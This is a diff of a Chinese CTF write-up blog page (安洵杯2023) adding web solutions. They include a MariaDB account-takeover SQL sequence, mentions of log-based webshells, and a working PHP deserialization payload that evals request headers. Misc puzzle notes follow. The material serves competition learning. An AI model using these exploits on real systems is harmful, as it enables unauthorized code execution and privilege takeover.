@@ -22,11 +22,22 @@
 
   <meta name="description" content="解题记录和复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SYCTF2023-wp">
+<meta property="og:title" content="安洵杯2023-wp">
 <meta property="og:url" content="http://example.com/2023/06/11/SYCTF2023/index.html">
 <meta property="og:site_name" content="unknown&#39;s Blog">
 <meta property="og:description" content="解题记录和复现">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611120521849.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611120903242.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611121020735.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611112434847.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611110028366.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611112658816.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611112718075.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611112745456.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611095226595.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611104554832.png">
+<meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611141305006.png">
 <meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230610095707838.png">
 <meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230610094943141.png">
 <meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230610095014545.png">
@@ -38,10 +49,10 @@
 <meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230610132955026.png">
 <meta property="og:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230610133030711.png">
 <meta property="article:published_time" content="2023-06-11T00:54:00.000Z">
-<meta property="article:modified_time" content="2023-06-11T00:55:14.110Z">
+<meta property="article:modified_time" content="2023-06-11T23:27:06.594Z">
 <meta property="article:author" content="unknown">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230610095707838.png">
+<meta name="twitter:image" content="http://example.com/2023/06/11/SYCTF2023/image-20230611120521849.png">
 
 <link rel="canonical" href="http://example.com/2023/06/11/SYCTF2023/">
 
@@ -56,7 +67,7 @@
   };
 </script>
 
-  <title>SYCTF2023-wp | unknown's Blog</title>
+  <title>安洵杯2023-wp | unknown's Blog</title>
   
 
 
@@ -184,7 +195,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SYCTF2023-wp
+          安洵杯2023-wp
         </h1>
 
         <div class="post-meta">
@@ -193,10 +204,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-06-11 08:54:00 / Modified: 08:55:14" itemprop="dateCreated datePublished" datetime="2023-06-11T08:54:00+08:00">2023-06-11</time>
+              <time title="Created: 2023-06-11 08:54:00" itemprop="dateCreated datePublished" datetime="2023-06-11T08:54:00+08:00">2023-06-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-06-12 07:27:06" itemprop="dateModified" datetime="2023-06-12T07:27:06+08:00">2023-06-12</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -219,16 +236,66 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="sudoku-easy"><a href="#sudoku-easy" class="headerlink" title="sudoku_easy"></a>sudoku_easy</h1><p>CTFer特有的不按套路出牌。</p>
+        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="CarelessPy"><a href="#CarelessPy" class="headerlink" title="CarelessPy"></a>CarelessPy</h2><p>看过start.sh，但是py_compile没了解过…….队友lolita做出来的。</p>
+<p><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/py_compile.html">https://docs.python.org/3/library/py_compile.html</a></p>
+<blockquote>
+<p>py_compile.<strong>compile</strong>(<em>file</em>, <em>cfile&#x3D;None</em>, <em>dfile&#x3D;None</em>, <em>doraise&#x3D;False</em>, <em>optimize&#x3D;- 1</em>, <em>invalidation_mode&#x3D;PycInvalidationMode.TIMESTAMP</em>, <em>quiet&#x3D;0</em>)</p>
+<p>Compile a source file to byte-code and write out the byte-code cache file. The source code is loaded from the file named <em>file</em>. The byte-code is written to <em>cfile</em>, which defaults to the <a target="_blank" rel="noopener" href="https://peps.python.org/pep-3147/"><strong>PEP 3147</strong></a>&#x2F;<a target="_blank" rel="noopener" href="https://peps.python.org/pep-0488/"><strong>PEP 488</strong></a> path, ending in <code>.pyc</code>. For example, if <em>file</em> is <code>/foo/bar/baz.py</code> <em>cfile</em> will default to <code>/foo/bar/__pycache__/baz.cpython-32.pyc</code> for Python 3.2. If <em>dfile</em> is specified, it is used instead of <em>file</em> as the name of the source file from which source lines are obtained for display in exception tracebacks. If <em>doraise</em> is true, a <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/py_compile.html#py_compile.PyCompileError"><code>PyCompileError</code></a> is raised when an error is encountered while compiling <em>file</em>. If <em>doraise</em> is false (the default), an error string is written to <code>sys.stderr</code>, but no exception is raised. This function returns the path to byte-compiled file, i.e. whatever <em>cfile</em> value was used.</p>
+</blockquote>
+<p>编译时候会在当前目录生成__pycache__，里面存了字节码，下载后反编译可以拿到secret_key，伪造cookie登录后是个xml文件，然后是xxe注入。</p>
+<p><img src="image-20230611120521849.png" alt="image-20230611120521849.png"></p>
+<h2 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h2><p>还是lolita做的。一开始我还在傻傻地手写sql注入脚本，他已经sqlmap跑出来了。</p>
+<p><img src="image-20230611120903242.png" alt="image-20230611120903242.png"><br>得到个页面。</p>
+<p>这个页面有个code参数，先跑一遍sqlmap，没啥东西。</p>
+<p><img src="image-20230611121020735.png" alt="image-20230611121020735.png"></p>
+<p>看了题目的描述，加上自己测试，发现code直接输sql语句即可，没有过滤。题目意思是让我们修改round choice的数据，即机器人第round轮猜拳的choice，插10条数据进去，再和机器人比猜拳，赢了就行。</p>
+<p>呜呜呜mariadb权限了解的少，没往权限那方面想，傻傻地insert，咦怎么数据插入不了？</p>
+<p>下面是lolita的做法，他当时没注意到secret有SUPER权限。我赛后恶补一波mariadb权限知识后然后本地复现的。</p>
+<hr>
+<p>大致原理：</p>
+<p>第一个页面的用户是index_user。</p>
+<p>第二个页面的用户是secret，有CREATE USER，select *.*，SUPER权限。（SUPER权限在这种做法用不到，写日志才用到）</p>
+<p>secure_file_priv是空的，可写文件。</p>
+<p>secret用户修改root用户哈希为index_user的哈希，删去index_user，将root改名为index_user。</p>
+<p>此时index_user相当于root，sqlmap连上，写shell。</p>
+<hr>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>准备工作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create user root2 identified by &#x27;123&#x27;;</span><br><span class="line">create user create_user identified by &#x27;333&#x27;;#比赛时的secret用户，第二个页面</span><br><span class="line">create user index_user identified by &#x27;333&#x27;;#比赛时index_user用户，第一个页面</span><br><span class="line">grant all privileges on *.* to root2;</span><br><span class="line">grant create user,select on *.* to create_user;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>开始测试。</p>
+<p>登录create_user（）</p>
+<p>查看权限：</p>
+<p><img src="image-20230611112434847.png" alt="image-20230611112434847.png"><br>查看密码哈希。</p>
+<p><img src="image-20230611110028366.png" alt="image-20230611110028366.png"><br>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter user root2 identified by password &#x27;*44019FB6C583EFACD2FB2F1A1960B97F86E36A74&#x27;;</span><br><span class="line">drop user index_user;</span><br><span class="line">rename user &#x27;root2&#x27; to &#x27;index_user&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230611112658816.png" alt="image-20230611112658816.png"><br>查看结果：</p>
+<p><img src="image-20230611112718075.png" alt="image-20230611112718075.png"><br>登录到index_user查看权限：</p>
+<p><img src="image-20230611112745456.png" alt="image-20230611112745456.png"><br>可以看到权限转移到了index_user这里。</p>
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>本地mysql和mariadb都测了，只有mariadb支持设置密码哈希的选项，mysql 5 8都不行。所以上面的做法如果拿不到index_user的明文密码，只有mariadb能做，mysql不可。</p>
+<p>mariadb的文档：</p>
+<p><img src="image-20230611095226595.png" alt="image-20230611095226595.png"><br>mysql的文档并没有这种写法，且自己测试也报语法错误。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="image-20230611104554832.png" alt="image-20230611104554832.png"></h2><p>我比赛时注意到SUPER权限，且已经成功写日志了，但是我去访问马的时候提示Access Denied？？？我以为是secret没有FILE权限，所以不能写东西。赛后本地测，发现只要有SUPER权限就能写日志马。好想再上靶机看看自己哪里搞错了(艹皿艹 )。</p>
+<h2 id="4号的罗纳尔多"><a href="#4号的罗纳尔多" class="headerlink" title="4号的罗纳尔多"></a>4号的罗纳尔多</h2><p>第一个正则过了，第二个__halt_compiler();想不到，也没搜到……</p>
+<p>源码，版本是php8.2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class evil&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if(&#x27;VanZZZZY&#x27; === preg_replace(&#x27;/;+/&#x27;,&#x27;VanZZZZY&#x27;,preg_replace(&#x27;/[A-Za-z_\(\)]+/&#x27;,&#x27;&#x27;,$this-&gt;cmd)))&#123;</span><br><span class="line">            eval($this-&gt;cmd.&#x27;givemegirlfriend!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;nonono2&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(!preg_match(&#x27;/^[Oa]:[\d]+|Array|Iterator|Object|List/i&#x27;,$_GET[&#x27;Pochy&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;Pochy&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;nonono&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp：要用php7运行，php8的不行，不知道为什么。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class evil&#123;</span><br><span class="line">    public $cmd = &quot;eval(end(getallheaders()));__halt_compiler();&quot;;</span><br><span class="line">    public $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$e = new evil();</span><br><span class="line">$a = new SplStack();</span><br><span class="line">$a-&gt;push($e);</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230611141305006.png" alt="image-20230611141305006.png"></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="sudoku-easy"><a href="#sudoku-easy" class="headerlink" title="sudoku_easy"></a>sudoku_easy</h2><p>CTFer特有的不按套路出牌。</p>
 <p><img src="image-20230610095707838.png" alt="image-20230610095707838.png"></p>
-<h1 id="烦人的压缩包"><a href="#烦人的压缩包" class="headerlink" title="烦人的压缩包"></a>烦人的压缩包</h1><p><img src="image-20230610094943141.png" alt="image-20230610094943141.png"></p>
+<h2 id="烦人的压缩包"><a href="#烦人的压缩包" class="headerlink" title="烦人的压缩包"></a>烦人的压缩包</h2><p><img src="image-20230610094943141.png" alt="image-20230610094943141.png"></p>
 <p><img src="image-20230610095014545.png" alt="image-20230610095014545.png"></p>
 <p><img src="image-20230610095059259.png" alt="image-20230610095059259.png"></p>
 <p>提示文件损坏这里卡了一小会，以为是伪加密什么的，然后翻一翻zip文件的结构，发现这个zip的压缩方式给改成00了，改回08即可打开。</p>
 <p><img src="image-20230610095210454.png" alt="image-20230610095210454.png"></p>
 <p><img src="image-20230610095228706.png" alt="image-20230610095228706.png"></p>
 <p><img src="image-20230610095240029.png" alt="image-20230610095240029.png"></p>
-<h1 id="sudoku-speedrun"><a href="#sudoku-speedrun" class="headerlink" title="sudoku_speedrun"></a>sudoku_speedrun</h1><p>题目要求是10s内解数独。多次测试后发现，若按R重新开始，题目还是原来的，但是时间重新计算了。所以我们可以不断R Y 循环，这样就有时间解数独了。但是就算解出来，也无法在10s内全部填完，所以要写脚本了。</p>
+<h2 id="sudoku-speedrun"><a href="#sudoku-speedrun" class="headerlink" title="sudoku_speedrun"></a>sudoku_speedrun</h2><p>题目要求是10s内解数独。多次测试后发现，若按R重新开始，题目还是原来的，但是时间重新计算了。所以我们可以不断R Y 循环，这样就有时间解数独了。但是就算解出来，也无法在10s内全部填完，所以要写脚本了。</p>
 <p>写脚本测试过程中发现，可以一次性发送答案，如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tn.write(b&#x27;1d1d1d1d&#x27;)</span><br></pre></td></tr></table></figure>
 
@@ -323,7 +390,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sudoku-easy"><span class="nav-number">1.</span> <span class="nav-text">sudoku_easy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%83%A6%E4%BA%BA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-number">2.</span> <span class="nav-text">烦人的压缩包</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sudoku-speedrun"><span class="nav-number">3.</span> <span class="nav-text">sudoku_speedrun</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CarelessPy"><span class="nav-number">1.1.</span> <span class="nav-text">CarelessPy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Confronting-robot"><span class="nav-number">1.2.</span> <span class="nav-text">Confronting robot</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.2.1.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%80%83"><span class="nav-number">1.2.2.</span> <span class="nav-text">思考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E5%8F%B7%E7%9A%84%E7%BD%97%E7%BA%B3%E5%B0%94%E5%A4%9A"><span class="nav-number">1.4.</span> <span class="nav-text">4号的罗纳尔多</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sudoku-easy"><span class="nav-number">2.1.</span> <span class="nav-text">sudoku_easy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%A6%E4%BA%BA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-number">2.2.</span> <span class="nav-text">烦人的压缩包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudoku-speedrun"><span class="nav-number">2.3.</span> <span class="nav-text">sudoku_speedrun</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
